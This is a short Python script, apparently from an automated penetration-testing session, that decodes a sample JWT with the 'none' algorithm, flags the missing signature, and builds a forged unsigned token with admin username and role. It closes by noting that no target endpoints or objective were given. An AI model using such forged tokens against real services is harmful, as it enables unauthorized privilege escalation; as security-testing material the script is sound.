import base64
import json

# Decode JWT token
token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9."

# Split token into parts
parts = token.split('.')
print(f"JWT Token Parts: {len(parts)}")
print(f"\nHeader (Part 1): {parts[0]}")
print(f"Payload (Part 2): {parts[1]}")
print(f"Signature (Part 3): {parts[2] if len(parts) > 2 else 'Missing'}")

# Decode header and payload
try:
    header_decoded = base64.urlsafe_b64decode(parts[0] + '=' * (4 - len(parts[0]) % 4))
    payload_decoded = base64.urlsafe_b64decode(parts[1] + '=' * (4 - len(parts[1]) % 4))
    
    header_json = json.loads(header_decoded)
    payload_json = json.loads(payload_decoded)
    
    print(f"\n[+] Decoded Header: {json.dumps(header_json, indent=2)}")
    print(f"[+] Decoded Payload: {json.dumps(payload_json, indent=2)}")
    
    # Check for security issues
    if header_json.get('alg') == 'none':
        print("\n[!] CRITICAL SECURITY ISSUE: Algorithm is 'none' - token is unsigned!")
        print("[!] This means tokens can be easily forged by anyone.")
        
    # Show how to create a forged admin token
    print("\n[+] Forged Admin Token (alg: none):")
    forged_header = {"alg": "none", "typ": "JWT"}
    forged_payload = {"username": "admin", "role": "admin"}
    
    forged_header_b64 = base64.urlsafe_b64encode(json.dumps(forged_header).encode()).decode().rstrip('=')
    forged_payload_b64 = base64.urlsafe_b64encode(json.dumps(forged_payload).encode()).decode().rstrip('=')
    forged_token = f"{forged_header_b64}.{forged_payload_b64}."
    
    print(f"Token: {forged_token}")
    print(f"Username: {forged_payload['username']}")
    print(f"Role: {forged_payload['role']}")
    
except Exception as e:
    print(f"[-] Error decoding token: {e}")

# Summary of context issues
print("\n" + "="*60)
print("CONTEXT ANALYSIS SUMMARY")
print("="*60)
print("Cookies/token provided: YES (JWT with alg:none)")
print("Target endpoints provided: NO")
print("Testing objectives provided: NO")
print("\nCannot proceed with security testing without:")
print("1. Target endpoint(s) to test")
print("2. Specific security testing objective")
print("\nNext steps: Provide endpoints and testing goal to proceed.")
